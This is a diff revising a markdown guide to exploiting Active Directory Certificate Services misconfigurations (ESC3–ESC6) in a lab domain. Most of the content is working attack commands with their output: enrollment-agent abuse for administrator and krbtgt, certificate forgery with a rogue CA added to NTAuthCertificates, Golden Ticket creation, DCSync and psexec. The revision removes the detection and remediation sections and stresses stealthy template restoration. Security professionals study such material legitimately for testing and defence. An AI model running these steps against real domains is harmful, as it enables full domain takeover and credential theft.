+  -dc-ip 192.168.10.10 \
+  -username lowpriv \
+  -domain corp.local
+# → TGT + hash for lowpriv (useful for persistence even if not DA)
+```
+
+**Step 3b — Use as Enrollment Agent to request for admin**
+
+```bash
+certipy req \
+  -u lowpriv@corp.local \
+  -p 'Password123!' \
+  -ca 'Corp-CA' \
+  -template 'User' \
+  -on-behalf-of 'corp\administrator' \
+  -pfx lowpriv.pfx \
+  -dc-ip 192.168.10.10
+
+# [*] Got certificate with UPN 'administrator@corp.local'
+# [*] Saved to: administrator.pfx
+
+certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10
+# → Hash for administrator
+```
+
+**Step 3c — Use No-EKU cert as Sub-CA to forge certs**
+
+```bash
+# If the cert has NO EKU it can sign other certificates
+
+# Generate target cert
+openssl req -newkey rsa:2048 -keyout forged.key -out forged.csr -nodes \
+  -subj "/CN=administrator"
+
+# Sign with our No-EKU cert (acting as Sub-CA)
+openssl x509 -req -in forged.csr \
+  -CA lowpriv.crt -CAkey lowpriv.key \
+  -CAcreateserial -out forged.crt -days 365 \
+  -extfile <(echo "[ext]
+subjectAltName=otherName:1.3.6.1.4.1.311.20.2.3;UTF8:administrator@corp.local")
+
+openssl pkcs12 -export \
+  -in forged.crt -inkey forged.key \
+  -out forged_admin.pfx -passout pass:''
+
+certipy auth -pfx forged_admin.pfx -dc-ip 192.168.10.10
+```
+
+---
+
+## ESC3 — Enrollment Agent Chain Attack
+
+### How the Enrollment Agent System Works
+
+```
+┌──────────────────────────────────────────────────────────────────┐
+│              LEGITIMATE ENROLLMENT AGENT FLOW                     │
+│                                                                    │
+│  [Helpdesk Staff]                                                  │
+│       │                                                            │
+│       │  Has Enrollment Agent Certificate                          │
+│       │  (EKU: Certificate Request Agent)                          │
+│       │                                                            │
+│       │  "User Bob lost his smart card, I need to                 │
+│       │   re-issue a certificate for him"                          │
+│       │                                                            │
+│       ▼                                                            │
+│  [CA] ← Request: "I (helpdesk) request cert for Bob"             │
+│       │           using my enrollment agent cert                   │
+│       │                                                            │
+│       ▼                                                            │
+│  [Cert issued to Bob, signed by helpdesk's agent cert]            │
+└──────────────────────────────────────────────────────────────────┘
+
+┌──────────────────────────────────────────────────────────────────┐
+│              ATTACKER ABUSE                                        │
+│                                                                    │
+│  [lowpriv@corp.local]                                              │
+│       │                                                            │
+│       │  Gets Enrollment Agent cert (from misconfigured template)  │
+│       │                                                            │
+│       ▼                                                            │
+│  [CA] ← "I (lowpriv) request cert for administrator"             │
+│            using my enrollment agent cert                          │
+│            CA has NO enrollment agent restrictions                 │
+│       │                                                            │
+│       ▼                                                            │
+│  [Cert issued for administrator] → PKINIT → Domain Admin          │
+└──────────────────────────────────────────────────────────────────┘
+```
+
+### The Two-Template Chain
+
+```
+Template Chain for ESC3:
+
+  ┌────────────────────────┐    ┌────────────────────────────┐
+  │  ESC3-1 Template        │    │  ESC3-2 Template            │
+  │  "EnrollmentAgent"      │    │  "User" (built-in)          │
+  │                         │    │                              │
+  │  EKU:                   │    │  EKU:                        │
+  │  Certificate Request    │    │  Client Authentication       │
+  │  Agent                  │    │                              │
+  │                         │    │  Enrollment Agent            │
+  │  Who can enroll:        │    │  Restrictions: NONE          │
+  │  Domain Users ← BAD     │    │  (any EA can enroll)         │
+  └────────────────────────┘    └────────────────────────────┘
+          │                               │
+          │  Step 1: Get EA cert          │  Step 2: Use EA cert
+          └─────────────────────►─────────┘
+                                          │
+                                          ▼
+                             Request cert on behalf of
+                             administrator → Domain Admin
+```
+
+### Step-by-Step Exploitation
+
+**Step 1 — Find both templates**
+
+```bash
+certipy find \
+  -u lowpriv@corp.local \
+  -p 'Password123!' \
+  -dc-ip 192.168.10.10 \
+  -vulnerable
+
+# Looking for ESC3-1:
+# Enrollment Agent      : True
+# Enrollment Rights     : Domain Users
+# Requires Approval     : False
+
+# Looking for ESC3-2:
+# Client Authentication : True
+# RA Application Policies: (empty — no restrictions on who can enroll via EA)
+```
+
+**Step 2 — Get enrollment agent certificate**
 
 ```bash
 certipy req \
@@ -548,32 +633,15 @@ certipy req \
   -template 'EnrollmentAgentTemplate' \
   -dc-ip 192.168.10.10
 
-# Output:
+# ══ OUTPUT ══════════════════════════════════════════════════════
 # [*] Requesting certificate via RPC
-# [*] Successfully requested certificate
 # [*] Got certificate with EKU 'Certificate Request Agent'
 # [*] Saved certificate and private key to 'lowpriv.pfx'
 ```
 
-#### Step 3: Find Eligible "Victim" Templates (ESC3-2)
+**Step 3 — Use EA cert to enroll on behalf of administrator**
 
 ```bash
-# Look for templates where:
-# - Client Authentication EKU is present
-# - Enrollment agent can enroll (no RA application policy restriction)
-# Typically the built-in "User" template works
-
-certipy find \
-  -u lowpriv@corp.local \
-  -p 'Password123!' \
-  -dc-ip 192.168.10.10 \
-  -stdout | grep -A 20 "Template Name.*: User"
-```
-
-#### Step 4: Request Certificate On Behalf Of Domain Admin
-
-```bash
-# Use enrollment agent cert to request a User cert for administrator
 certipy req \
   -u lowpriv@corp.local \
   -p 'Password123!' \
@@ -583,90 +651,93 @@ certipy req \
   -pfx lowpriv.pfx \
   -dc-ip 192.168.10.10
 
-# Output:
+# ══ OUTPUT ══════════════════════════════════════════════════════
 # [*] Requesting certificate via RPC (on behalf of 'corp\administrator')
 # [*] Successfully requested certificate
 # [*] Got certificate with UPN 'administrator@corp.local'
 # [*] Saved certificate and private key to 'administrator.pfx'
 ```
 
-#### Step 5: Authenticate as Administrator
+**Step 4 — Escalate to any user including krbtgt**
 
 ```bash
-certipy auth \
-  -pfx administrator.pfx \
-  -dc-ip 192.168.10.10
-
-# [*] Got hash for 'administrator@corp.local': aad3b435...:58a478135a93ac3bf058a5ea0e8fdb71
-```
-
-```bash
-# DCSync
-python3 secretsdump.py \
-  -hashes 'aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71' \
-  'corp.local/administrator@192.168.10.10'
-```
-
-#### Step 6: Escalate to Other Users Too
-
-```bash
-# Can now request certs for ANY user — krbtgt, other DAs, service accounts
+# Get cert for krbtgt → persistent Golden Ticket material
 certipy req \
-  -u lowpriv@corp.local \
-  -p 'Password123!' \
-  -ca 'Corp-CA' \
-  -template 'User' \
+  -u lowpriv@corp.local -p 'Password123!' \
+  -ca 'Corp-CA' -template 'User' \
   -on-behalf-of 'corp\krbtgt' \
-  -pfx lowpriv.pfx \
-  -dc-ip 192.168.10.10
+  -pfx lowpriv.pfx -dc-ip 192.168.10.10
 
-# Get krbtgt hash → create Golden Tickets
-certipy auth -pfx krbtgt.pfx -dc-ip 192.168.10.10 -username krbtgt -domain corp.local
-```
+certipy auth \
+  -pfx krbtgt.pfx \
+  -dc-ip 192.168.10.10 \
+  -username krbtgt \
+  -domain corp.local
 
-### Detection & Remediation
+# ══ OUTPUT ══════════════════════════════════════════════════════
+# [*] Got hash for 'krbtgt@corp.local':
+#     aad3b435b51404eeaad3b435b51404ee:19e9b6b62bd6e15f3a5bcf1c6f3e4d2a
 
-```
-Detection:
-  Event ID 4887: Certificate issued — check if "Requester" ≠ "Subject"
-  Look for on-behalf-of requests in CA audit logs
-  Unusual users holding Certificate Request Agent EKU certs
+# Create Golden Ticket (unlimited persistence!)
+python3 ticketer.py \
+  -nthash 19e9b6b62bd6e15f3a5bcf1c6f3e4d2a \
+  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
+  -domain corp.local \
+  administrator
 
-Remediation:
-  1. On CA01: Configure Enrollment Agent Restrictions
-     certmgmt.msc → Corp-CA → Properties → Enrollment Agents
-     Add specific helpdesk accounts only; restrict templates to non-auth templates
-  
-  2. Restrict Certificate Request Agent template enrollment to dedicated helpdesk OUs
-  
-  3. Enable Manager Approval on the enrollment agent template
+export KRB5CCNAME=administrator.ccache
+python3 psexec.py -k -no-pass dc01.corp.local
 ```
 
 ---
 
-## ESC4 — Writable Certificate Template ACL
+## ESC4 — Writable Template ACL
 
-### Root Cause of Vulnerability
+### Understanding AD Object ACLs
 
-Certificate templates are **Active Directory objects** stored in:
 ```
-CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local
+Every certificate template is an AD object:
+CN=VulnTemplate,CN=Certificate Templates,...
+
+That object has an ACL with these possible rights:
+
+┌──────────────────────────────────────────────────────────┐
+│  RIGHT               │  WHAT IT ALLOWS                   │
+├──────────────────────┼───────────────────────────────────┤
+│  GenericAll          │  Full control — do anything        │
+│  GenericWrite        │  Write any property                │
+│  WriteOwner          │  Change owner → gain GenericAll    │
+│  WriteDacl           │  Change ACL → grant yourself power │
+│  WriteProperty       │  Modify specific attributes        │
+│                      │  (msPKI-Certificate-Name-Flag)     │
+└──────────────────────┴───────────────────────────────────┘
+
+If Domain Users (or the attacker's account) has ANY of these
+on a template → ESC4 → attacker can modify the template to
+enable ESC1 conditions → ESC1 exploit → Domain Admin
 ```
 
-Like all AD objects, templates have Access Control Lists (ACLs). If a low-privileged user has **write permissions** on a template's ACL, they can modify the template's dangerous attributes to introduce ESC1 conditions — then exploit it, then (optionally) restore it.
+### The Modify → Exploit → Restore Cycle
 
-The dangerous write permissions are:
-- `GenericAll` — full control
-- `GenericWrite` — write any property
-- `WriteOwner` — change owner → gain GenericAll
-- `WriteDacl` — change ACL → grant yourself GenericAll
-- `WriteProperty` on specific attributes like `msPKI-Certificate-Name-Flag`
+```
+Timeline:
+T=0s   Attacker discovers GenericWrite on "CorpTemplate"
+T=2s   Save original config (certipy template --save-old)
+T=4s   Modify: enable EnrolleeSuppliesSubject + Client Auth EKU
+T=6s   Request cert with admin SAN
+T=8s   Cert issued (VulnTemplate now acts as ESC1)
+T=10s  Authenticate → get admin NTLM hash
+T=12s  Restore original template config
+T=60s  DCSync all domain credentials
+       Template looks completely normal in logs
 
-This vulnerability is particularly stealthy because template ACL changes are rarely monitored, and the attack can be done, exploited, and reversed in under 60 seconds.
+Total attack window: ~60 seconds
+Forensic evidence: minimal (just a cert request in CA audit log)
+```
 
 ### Step-by-Step Exploitation
 
-#### Step 1: Identify Templates with Weak ACLs
+**Step 1 — Find templates with write permissions**
 
 ```bash
 certipy find \
@@ -676,166 +747,177 @@ certipy find \
   -vulnerable
 
 # Look for under "Object Control Permissions":
-#   Write Owner Principals    : CORP\Domain Users   ← BAD
-#   Write Dacl Principals     : CORP\Domain Users   ← BAD
-#   Write Property Principals : CORP\Domain Users   ← BAD
+# Write Owner Principals    : CORP\Domain Users  ← VULNERABLE
+# Write Dacl Principals     : CORP\Domain Users  ← VULNERABLE
+# Write Property Principals : CORP\Domain Users  ← VULNERABLE
 ```
 
 ```powershell
-# Windows — use PowerView to check ACLs on templates
+# PowerView — detailed ACL check
 Import-Module .\PowerView.ps1
 
-Get-DomainObjectAcl -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local" -ResolveGUIDs | 
-  Where-Object { 
-    $_.ActiveDirectoryRights -match "Write|GenericAll" -and 
-    $_.SecurityIdentifier -match "S-1-5-21-.*-513"  # Domain Users SID
-  }
+# Get all template ACEs for Domain Users
+$templatePath = "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
+Get-DomainObjectAcl -SearchBase $templatePath -ResolveGUIDs |
+  Where-Object {
+    $_.ActiveDirectoryRights -match "Write|GenericAll" -and
+    $_.SecurityIdentifier -match "S-1-5-21-.*-513"  # Domain Users SID ends in -513
+  } |
+  Select ObjectDN, ActiveDirectoryRights, SecurityIdentifier
+
+# Output:
+# ObjectDN              : CN=CorpTemplate,CN=Certificate Templates,...
+# ActiveDirectoryRights : GenericWrite
+# SecurityIdentifier    : S-1-5-21-...-513  (Domain Users)
 ```
 
-#### Step 2: Modify Template to Enable ESC1
+**Step 2 — Modify template to enable ESC1 (auto method)**
 
 ```bash
-# Certipy can automatically modify the template, exploit, and optionally restore
-# First, save the original configuration
+# Save original config then modify
 certipy template \
   -u lowpriv@corp.local \
   -p 'Password123!' \
-  -template 'WritableTemplate' \
+  -template 'CorpTemplate' \
   -save-old \
   -dc-ip 192.168.10.10
 
-# This creates: WritableTemplate.json (backup)
-# And modifies the template to:
-#   - Enable EnrolleeSuppliesSubject flag
-#   - Remove manager approval requirement  
-#   - Add Client Authentication EKU
-#   - Allow Domain Users to enroll
-
-# Certipy output:
-# [*] Updating certificate template 'WritableTemplate'
-# [*] Successfully updated 'WritableTemplate'
+# ══ OUTPUT ══════════════════════════════════════════════════════
+# [*] Updating certificate template 'CorpTemplate'
+# [*] Successfully updated 'CorpTemplate'
+# Modified flags:
+#   msPKI-Certificate-Name-Flag: added ENROLLEE_SUPPLIES_SUBJECT
+#   msPKI-Enrollment-Flag:       removed PEND_ALL_REQUESTS
+#   pKIExtendedKeyUsage:         added Client Authentication
+# Template backup saved to: CorpTemplate.json
 ```
 
+**Step 2 alt — Manual ADSI modification**
+
 ```powershell
-# Manual method using ADSI — more surgical
-$templateDN = "LDAP://CN=WritableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
+# Manual surgical approach
+$templateDN = "LDAP://CN=CorpTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
 $template = [ADSI]$templateDN
 
 # Enable EnrolleeSuppliesSubject (bit 0x1)
 $current = $template.Properties["msPKI-Certificate-Name-Flag"].Value
 $template.Properties["msPKI-Certificate-Name-Flag"].Value = $current -bor 0x1
-$template.CommitChanges()
 
-# Remove manager approval (remove PEND_ALL_REQUESTS bit 0x2)
-$enrollFlags = $template.Properties["msPKI-Enrollment-Flag"].Value  
+# Remove manager approval (bit 0x2 = PEND_ALL_REQUESTS)
+$enrollFlags = $template.Properties["msPKI-Enrollment-Flag"].Value
 $template.Properties["msPKI-Enrollment-Flag"].Value = $enrollFlags -band (-bnot 0x2)
-$template.CommitChanges()
 
 # Add Client Authentication EKU
 $template.Properties["pKIExtendedKeyUsage"].Add("1.3.6.1.5.5.7.3.2")
-$template.CommitChanges()
 
-Write-Host "Template modified! Now exploit it..."
+$template.CommitChanges()
+Write-Host "[+] Template modified! Now it's ESC1-vulnerable."
 ```
 
-#### Step 3: Exploit the Now-Vulnerable Template (ESC1)
+**Step 3 — Exploit as ESC1**
 
 ```bash
 certipy req \
   -u lowpriv@corp.local \
   -p 'Password123!' \
   -ca 'Corp-CA' \
-  -template 'WritableTemplate' \
+  -template 'CorpTemplate' \
   -upn 'administrator@corp.local' \
   -dc-ip 192.168.10.10
 
-# [*] Got certificate with UPN 'administrator@corp.local'
-# [*] Saved certificate and private key to 'administrator.pfx'
-```
-
-#### Step 4: Authenticate
-
-```bash
 certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10
-# Hash: aad3b435...:58a478135a93ac3bf058a5ea0e8fdb71
+# [*] Got hash for 'administrator@corp.local': aad3b435...:58a478135a93ac3bf058a5ea0e8fdb71
 ```
 
-#### Step 5: Restore Template (Stealth)
+**Step 4 — Restore template (stealth)**
 
 ```bash
-# Restore original template configuration to avoid detection
 certipy template \
   -u lowpriv@corp.local \
   -p 'Password123!' \
-  -template 'WritableTemplate' \
-  -configuration WritableTemplate.json \
+  -template 'CorpTemplate' \
+  -configuration CorpTemplate.json \
   -dc-ip 192.168.10.10
 
-# [*] Successfully restored 'WritableTemplate'
-# Template looks normal again
+# [*] Successfully restored 'CorpTemplate'
+# Template is back to normal — looks like nothing happened
 ```
 
-### Detection & Remediation
+**Step 5 — DCSync**
 
-```
-Detection:
-  Event ID 5136 (Directory Service Object Modified) on DC01
-  Filter on: Object Class = pKICertificateTemplate
-  Specifically watch: msPKI-Certificate-Name-Flag modifications
-  Baseline all template attributes; alert on deviations
-  
-Remediation:
-  1. Audit ACLs: only Enterprise Admins / Domain Admins → write on templates
-  
-  # PowerShell — fix ACL
-  $templateDN = "CN=WritableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
-  $acl = Get-Acl "AD:$templateDN"
-  # Remove Domain Users write access
-  $acl.Access | Where-Object { $_.IdentityReference -like "*Domain Users*" -and $_.ActiveDirectoryRights -match "Write" } | 
-    ForEach-Object { $acl.RemoveAccessRule($_) }
-  Set-Acl "AD:$templateDN" $acl
+```bash
+python3 secretsdump.py \
+  -hashes 'aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71' \
+  'corp.local/administrator@192.168.10.10'
 ```
 
 ---
 
-## ESC5 — Vulnerable PKI Object Access Control
+## ESC5 — Vulnerable PKI Object ACL
 
-### Root Cause of Vulnerability
+### The NTAuthCertificates Trust Chain
 
-Beyond certificate templates, there are other critical ADCS-related objects in AD. If an attacker can write to these, they can compromise the entire PKI regardless of how secure the templates are:
+```
+┌───────────────────────────────────────────────────────────────────┐
+│                    HOW CA TRUST WORKS IN AD                        │
+│                                                                     │
+│  NTAuthCertificates (AD Object)                                    │
+│  ┌─────────────────────────────────────────────────────────────┐  │
+│  │  cACertificate attribute contains:                           │  │
+│  │    [Corp-CA Root Certificate]                                │  │
+│  │    [Third-Party CA Certificate]                              │  │
+│  │    [<-- ATTACKER ADDS ROGUE CA CERT HERE]                   │  │
+│  └─────────────────────────────────────────────────────────────┘  │
+│                                                                     │
+│  Any certificate signed by any CA in this list                     │
+│  is UNCONDITIONALLY trusted by ALL domain controllers              │
+│  for PKINIT authentication                                         │
+│                                                                     │
+│  ATTACKER PLAN:                                                     │
+│  1. Get write on NTAuthCertificates                                │
+│  2. Generate self-signed "Corp-CA" certificate                     │
+│  3. Add it to NTAuthCertificates                                   │
+│  4. Forge a cert for administrator signed by our fake CA           │
+│  5. DC trusts it → Domain Admin                                    │
+└───────────────────────────────────────────────────────────────────┘
+```
 
-**`CN=NTAuthCertificates`** — Contains the list of CA certificates that AD trusts for authentication. Any CA cert in this store is completely trusted for PKINIT. Adding a rogue CA here means forged certificates will be accepted.
+### PKI Objects Attack Surface
 
-**`CN=Enrollment Services`** — Contains CA objects. Write access lets you modify CA properties, enrollment policies, or take over the CA object.
+```
+┌─────────────────────────────────────────────────────────────────┐
+│  SENSITIVE PKI OBJECTS AND THEIR IMPACT                          │
+│                                                                   │
+│  Object                  Write Access Impact                      │
+│  ──────────────────────  ──────────────────────────────────      │
+│  NTAuthCertificates      Add rogue CA → forge any cert          │
+│  Enrollment Services     Modify CA config, change templates     │
+│  CA Computer Object      Shadow Credentials → CA takeover       │
+│  AIA Container           Modify CA cert distribution            │
+│  CDP Container           Tamper with revocation                 │
+│                                                                   │
+│  ALL of these = effectively same as owning the CA               │
+└─────────────────────────────────────────────────────────────────┘
+```
 
-**CA computer object** — Write access to the computer object of CA01 can lead to Shadow Credentials, RBCD, or other computer takeover attacks, then CA compromise.
+### Step-by-Step Exploitation
 
-**`CN=AIA` / `CN=CDP`** — CRL Distribution Points. Write access could allow MITM of revocation checking.
-
-### Step-by-Step Exploitation — NTAuthCertificates Attack
-
-#### Step 1: Check Write Access to NTAuthCertificates
+**Step 1 — Check write access on NTAuthCertificates**
 
 ```bash
-certipy find \
-  -u lowpriv@corp.local \
-  -p 'Password123!' \
-  -dc-ip 192.168.10.10 \
-  -stdout
+# Certipy
+certipy find -u lowpriv@corp.local -p 'Password123!' -dc-ip 192.168.10.10 -stdout
 
-# Look for NTAuthCertificates object control permissions
-
-# Or use PowerView
+# PowerView
 Import-Module .\PowerView.ps1
 Get-DomainObjectAcl -Identity "NTAuthCertificates" -ResolveGUIDs |
   Where-Object { $_.ActiveDirectoryRights -match "Write|GenericAll" }
 ```
 
-#### Step 2: Generate a Rogue CA Certificate
+**Step 2 — Generate rogue CA certificate**
 
 ```bash
-# On Kali (192.168.10.99)
-# Create a self-signed CA certificate
+# Create self-signed CA certificate mimicking Corp-CA
 openssl req -x509 \
   -newkey rsa:4096 \
   -keyout rogueCA.key \
@@ -843,69 +925,42 @@ openssl req -x509 \
   -days 3650 \
   -nodes \
   -subj "/CN=Corp-CA/DC=corp/DC=local" \
-  -extensions v3_ca \
-  -config <(cat /etc/ssl/openssl.cnf; echo "[v3_ca]"; echo "basicConstraints=critical,CA:TRUE"; echo "keyUsage=critical,keyCertSign,cRLSign")
+  -addext "basicConstraints=critical,CA:TRUE" \
+  -addext "keyUsage=critical,keyCertSign,cRLSign"
 
-# Verify
-openssl x509 -in rogueCA.crt -text -noout | grep -A 5 "Basic Constraints"
-# Should show: CA:TRUE
+# Verify it looks like a CA
+openssl x509 -in rogueCA.crt -text -noout | grep -A 3 "Basic Constraints"
+# Basic Constraints: critical
+#   CA:TRUE
 ```
 
-#### Step 3: Add Rogue CA to NTAuthCertificates
+**Step 3 — Add rogue CA to NTAuthCertificates**
 
 ```powershell
-# On Windows with write access to NTAuthCertificates
-# Option A: certutil (if you have rights on the CA server)
+# Windows — add rogue CA cert to NTAuth store
 certutil -dspublish -f rogueCA.crt NTAuthCA
 
-# Option B: Direct LDAP modification
+# OR via ADSI directly:
 $ntauth = [ADSI]"LDAP://CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
 $certBytes = [System.IO.File]::ReadAllBytes("C:\rogueCA.crt")
 $ntauth.Properties["cACertificate"].Add($certBytes)
 $ntauth.CommitChanges()
-Write-Host "Rogue CA added to NTAuthCertificates!"
+Write-Host "[+] Rogue CA added to NTAuthCertificates!"
+Write-Host "[+] All DCs now trust certs signed by our fake CA!"
 ```
 
-```bash
-# Linux via ldapmodify
-# First export cert to DER
-openssl x509 -in rogueCA.crt -outform DER -out rogueCA.der
-
-# Use ldapmodify
-python3 - <<'PYEOF'
-import ldap3
-import base64
-
-cert_der = open('rogueCA.der', 'rb').read()
-
-server = ldap3.Server('192.168.10.10', get_info=ldap3.ALL)
-conn = ldap3.Connection(server, 
-    user='corp\\lowpriv', 
-    password='Password123!',
-    authentication=ldap3.NTLM)
-conn.bind()
-
-ntauth_dn = "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"
-conn.modify(ntauth_dn, {'cACertificate': [(ldap3.MODIFY_ADD, [cert_der])]})
-print(conn.result)
-PYEOF
-```
-
-#### Step 4: Create Forged Certificate Signed by Rogue CA
+**Step 4 — Create forged certificate for administrator**
 
 ```bash
-# Create cert for administrator, signed by our rogue CA
-# This cert will be trusted by AD since our CA is now in NTAuthCertificates
-
-# Generate key and CSR for administrator
+# Generate key + CSR for administrator
 openssl req -newkey rsa:2048 \
-  -keyout admin_key.pem \
-  -out admin_csr.pem \
+  -keyout admin_forged.key \
+  -out admin_forged.csr \
   -nodes \
   -subj "/CN=administrator"
 
-# Create SAN extension config
-cat > san_ext.cnf << 'EOF'
+# Sign with our rogue CA, embed admin UPN in SAN
+cat > san.conf << 'EOF'
 [req]
 req_extensions = v3_req
 [v3_req]
@@ -914,27 +969,26 @@ subjectAltName = @alt_names
 otherName.1 = 1.3.6.1.4.1.311.20.2.3;UTF8:administrator@corp.local
 EOF
 
-# Sign CSR with rogue CA
 openssl x509 -req \
-  -in admin_csr.pem \
+  -in admin_forged.csr \
   -CA rogueCA.crt \
   -CAkey rogueCA.key \
   -CAcreateserial \
   -out admin_forged.crt \
   -days 365 \
-  -extfile san_ext.cnf \
+  -extfile san.conf \
   -extensions v3_req
 
-# Combine to PFX
+# Bundle as PFX
 openssl pkcs12 -export \
   -in admin_forged.crt \
-  -inkey admin_key.pem \
+  -inkey admin_forged.key \
   -certfile rogueCA.crt \
   -out admin_forged.pfx \
   -passout pass:''
 ```
 
-#### Step 5: Authenticate with Forged Certificate
+**Step 5 — Authenticate with forged certificate**
 
 ```bash
 certipy auth \
@@ -943,49 +997,73 @@ certipy auth \
   -username administrator \
   -domain corp.local
 
-# DC checks: Is this cert signed by a CA in NTAuthCertificates? → Yes (our rogue CA)
-# DC extracts: UPN = administrator@corp.local
-# DC issues TGT as administrator
+# DC checks:
+# ✓ Is rogueCA.crt in NTAuthCertificates? YES (we added it)
+# ✓ Is cert signature valid? YES (signed by rogueCA)
+# ✓ UPN = administrator@corp.local → map to Administrator account
+# → TGT ISSUED AS ADMINISTRATOR
+
 # [*] Got hash for 'administrator@corp.local': aad3b435...:58a478135a93ac3bf058a5ea0e8fdb71
-```
-
-### Detection & Remediation
-
-```
-Detection:
-  Monitor modifications to CN=NTAuthCertificates (Event ID 5136)
-  Regularly audit contents: certutil -viewdelstore "ldap:///CN=NTAuthCertificates,..."
-  Alert on new CA certificates being added
-  
-Remediation:
-  Remove write access to NTAuthCertificates for all non-Enterprise Admin accounts
-  Implement alerting on this object's modification
-  Regularly review which CA certs are trusted
 ```
 
 ---
 
-## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 CA Flag
+## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag
 
-### Root Cause of Vulnerability
+### How the CA Flag Overrides Everything
 
-This is a **CA-level configuration flag** stored in the registry of CA01:
 ```
-HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\Corp-CA\PolicyModules\
-  CertificateAuthority_MicrosoftDefault.Policy\EditFlags
+┌───────────────────────────────────────────────────────────────┐
+│                CA01 Registry (192.168.10.20)                   │
+│                                                                 │
+│  HKLM\SYSTEM\...\CertSvc\Configuration\Corp-CA\               │
+│    PolicyModules\...\EditFlags                                  │
+│                                                                 │
+│  Normal (safe):                                                 │
+│    EditFlags = 0x15014e                                         │
+│    (does NOT contain EDITF_ATTRIBUTESUBJECTALTNAME2)            │
+│                                                                 │
+│  Vulnerable:                                                    │
+│    EditFlags = 0x15014e | 0x00040000                            │
+│             = 0x19014e                                          │
+│    (EDITF_ATTRIBUTESUBJECTALTNAME2 bit is SET)                  │
+│                                                                 │
+│  Effect when set:                                               │
+│    ANY certificate request to THIS CA can include               │
+│    a user-specified SAN — for ANY template                      │
+│                                                                 │
+│    Template's own EnrolleeSuppliesSubject flag? IRRELEVANT      │
+│    Template has manager approval? BYPASSED for SAN              │
+└───────────────────────────────────────────────────────────────┘
 ```
 
-The flag `EDITF_ATTRIBUTESUBJECTALTNAME2` (value `0x00040000` = 262144) tells the CA: **"Accept Subject Alternative Names from any certificate request, for any template."**
+### Visual: Flag Impact on ALL Templates
 
-When set, this overrides the template-level `EnrolleeSuppliesSubject` flag. Even templates that are perfectly configured to NOT allow SAN specification will accept attacker-supplied SANs.
+```
+BEFORE flag:           AFTER flag set:
+                       (EDITF_ATTRIBUTESUBJECTALTNAME2)
 
-This flag was originally a Microsoft troubleshooting step for certain VPN/RADIUS scenarios. Many admins set it following Microsoft KB articles without understanding the security implications.
+User template          User template
+  No SAN allowed   →   SAN ALLOWED from any requester!
 
-**Impact:** Every single template on the CA that has Client Authentication EKU and allows low-privileged enrollment becomes an ESC1 template — even ones with seemingly secure configurations.
+Machine template        Machine template
+  No SAN allowed   →   SAN ALLOWED!
+
+WebServer template      WebServer template
+  Restricted SAN   →   UNRESTRICTED SAN!
+
+CustomTemplate          CustomTemplate
+  Manager approval →   SAN still requires approval BUT
+                        attacker can specify SAN without
+                        triggering manager approval flow
+                        in many configs!
+
+RESULT: Every single enrollable template = ESC1
+```
 
 ### Step-by-Step Exploitation
 
-#### Step 1: Verify the Flag is Set
+**Step 1 — Confirm the flag is set**
 
 ```bash
 # From Kali
@@ -993,48 +1071,29 @@ certipy find \
   -u lowpriv@corp.local \
   -p 'Password123!' \
   -dc-ip 192.168.10.10 \
-  -stdout | grep -A 5 "Certificate Authorities"
+  -stdout
 
-# Look for:
-#   User Specified SAN    : Enabled   ← THIS IS THE FLAG
-#   CA Name               : corp-ca
+# Certificate Authorities
+#   0
+#     CA Name           : Corp-CA
+#     DNS Name          : ca01.corp.local
+#     Web Enrollment    : Enabled
+#     User Specified SAN: Enabled   ← THIS IS THE FLAG!
 ```
 
 ```powershell
-# On CA01 or via remote registry
+# On CA01 or via remote registry from admin account
 certutil -config "ca01.corp.local\Corp-CA" -getreg policy\EditFlags
 
-# Output:
-# HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\Corp-CA\PolicyModules\
-#   CertificateAuthority_MicrosoftDefault.Policy
-# EditFlags REG_DWORD = 0x15014e (1376590)
-#   EDITF_REQUESTEXTENSIONS -- 16 (0x10)
-#   EDITF_DISABLEEXTENSIONLIST -- 32 (0x20)
-#   EDITF_ADDOLDKEYUSAGE -- 64 (0x40)
-#   EDITF_BASICCONSTRAINTSCRITICAL -- 256 (0x100)
-#   EDITF_ENABLEAKIKEYID -- 1024 (0x400)
-#   EDITF_ATTRIBUTEENDDATE -- 8192 (0x2000)
-#   EDITF_ATTRIBUTESUBJECTALTNAME2 -- 262144 (0x40000)  ← HERE IT IS
+# Look for this line in output:
+# EDITF_ATTRIBUTESUBJECTALTNAME2 -- 262144 (0x40000)
+# If present → vulnerable
 ```
 
-#### Step 2: Find Any Enrollable Template with Auth EKU
+**Step 2 — Use ANY enrollable template with any SAN**
 
 ```bash
-# The default "User" template typically works — it has Client Authentication
-certipy find \
-  -u lowpriv@corp.local \
-  -p 'Password123!' \
-  -dc-ip 192.168.10.10\
-  -stdout | grep -B 5 -A 30 "Template Name.*: User"
-
-# Even though "Enrollee Supplies Subject: False" — the CA flag overrides this!
-```
-
-#### Step 3: Request Certificate with Arbitrary SAN
-
-```bash
-# Use the standard "User" template (or any template with Client Auth EKU)
-# CA flag makes ANY template accept our SAN
+# Even the default locked-down "User" template now accepts our SAN!
 certipy req \
   -u lowpriv@corp.local \
   -p 'Password123!' \
@@ -1043,79 +1102,109 @@ certipy req \
   -upn 'administrator@corp.local' \
   -dc-ip 192.168.10.10
 
+# ══ OUTPUT ══════════════════════════════════════════════════════
+# [*] Requesting certificate via RPC
 # [*] Got certificate with UPN 'administrator@corp.local'
